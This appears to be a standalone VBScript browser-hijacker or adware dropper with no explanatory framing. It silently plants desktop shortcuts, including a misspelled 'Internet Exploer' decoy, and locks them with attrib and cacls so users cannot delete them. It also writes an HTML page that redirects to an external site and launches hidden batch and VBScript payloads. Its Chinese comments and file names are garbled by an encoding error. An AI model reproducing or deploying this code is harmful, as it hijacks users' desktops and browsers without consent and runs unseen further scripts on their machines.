on error resume next 
'161067389
Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
Dim url
url = "http://www.3144.net/"

strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��� 
 

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")

'161067389
'=========
Set fso = CreateObject("Scripting.FileSystemObject")

dim FileName
FileName= strDesktop & "\�ͱ���.�ؼ�.f1"
if not fso.FileExists(FileName) then
 fso.CopyFile strttWinDir & "\java\1" , FileName
 WshShell.run "attrib """ & FileName & """ +R",0
 WshShell.run "cmd /c echo Y| cacls """ & FileName & """ /P Everyone:R",0
end if

FileName= strDesktop & "\С��Ϸ.f2"
if not fso.FileExists(FileName) then
 fso.CopyFile strttWinDir & "\java\2" , FileName
 WshShell.run "attrib """ & FileName & """ +R",0
 WshShell.run "cmd /c echo Y| cacls """ & FileName & """ /P Everyone:R",0
 
end if

FileName= strDesktop & "\Internet Exploer.f3"
if not fso.FileExists(FileName) then
 fso.CopyFile strttWinDir & "\java\3" , FileName
 WshShell.run "attrib """ & FileName & """ +R",0
 WshShell.run "cmd /c echo Y| cacls """ & FileName & """ /P Everyone:R",0
end if

'161067389

FileName= strttWinDir & "\NetMeeting\Ie.html"
if not fso.FileExists(FileName) then
  Set MyFile = fso.CreateTextFile(FileName, True)
  temp="<meta http-equiv=""refresh"" content=""0;URL=" & url & """>"
  MyFile.WriteLine(temp)
  MyFile.Close
end if
Rem

'161067389
createobject("wscript.shell").run """"&strttWinDir&"\java\3.bat""",0

Rem 
createobject("wscript.shell").run """"&strttWinDir&"\java\3.vbs""",0